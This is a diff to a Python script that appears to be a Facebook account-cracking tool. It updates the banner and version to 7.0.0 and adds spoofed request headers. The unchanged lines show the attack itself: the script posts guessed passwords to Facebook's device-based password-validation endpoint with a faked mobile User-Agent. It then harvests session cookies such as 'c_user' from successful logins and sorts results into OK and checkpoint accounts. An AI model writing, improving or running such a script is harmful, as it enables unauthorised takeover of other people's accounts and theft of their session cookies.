@@ -77,14 +77,14 @@ logo =                                          """
  |  \/  | ____| \ | |_   _|/ \  | |    
  | |\/| |  _| |  \| | | | / _ \ | |    
  | |  | | |___| |\  | | |/ ___ \| |___ 
- |_|  |_|_____|_| \_| |_/_/   \_\_____|
+ |_|  |_|_____|_| \_| |_/_/   \_\_____|,DaNi
                                        
 
 \x1b[1;97m------------------------\x1b[1;97m------------------------
 \033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m          [=🇵🇰 PAKISTAN ZINDABAD🇵🇰=]
-\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          JUST BELIEVE IN YOURSELF
+\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          JUST BELIEVE IN ALLAH
 \033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           [[=🇵🇰💪🏻=]]
-\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             6.0.0
+\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             7.0.0
 \033[1;37m------------------------\033[1;37m------------------------ """                                              
 
 def hasil(OK,cp):
@@ -183,19 +183,41 @@ class __xxx__:
                     "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                 }
                 header2={
-                "Host": 'h.facebook.com',
-               "Connection": "keep-alive",
-               "Cache-Control": "max-age=0",
-              "Upgrade-Insecure-Requests": "1",
+                      "Host": 'h.facebook.com',
+                      "Connection": "keep-alive",
+                      "Cache-Control": "max-age=0",
+                      "Upgrade-Insecure-Requests": "1",
 
-              "User-Agent": "Mozilla/5.0 (Linux; Android 12; RMX3195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+                      "User-Agent": "Mozilla/5.0 (Linux; Android 12; RMX3195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
 
-               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
 
-               "Accept-Encoding": "gzip, deflate",
+                       "Accept-Encoding": "gzip, deflate",
 
-                "Accept-Language": "en-US,en;q=0.9",
+                        "Accept-Language": "en-US,en;q=0.9",
                }
+                header = {
+                     "authority": 'free.facebook.com',
+
+                     "method": "POST",
+
+                     "path": "/ajax/weblite_load_logging/71-71769037061670222398e-client impression&t=1933&s=1&1sc-08swc=1&fyc-08ardr=fals e&a=181w-36080-36081h-668&h=668&w=360&sh=800&sa=360&sah-800&dpr=2&u=https://m.facebook.com/?Zmode0 free&hrc=1&paipv300&ea3DAYSMAuldrX73px1X30CfYSzackNdMKK1cH4J0ptp$53shMXsYn301673-kf1fk31 26_rdr&h-fa",
+
+                     "scheme": "https",
+                     
+                     "accept": "*/*",
+
+                     "accept-encoding": "gzip, deflate, br",
+
+                     "accept-language": "en-US,en;q-0.9",
+
+                    
+                     "origin": "https://m.facebook.com",
+
+                     "referer": "https://m.facebook.com/",
+                   }
+                   
+                    
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
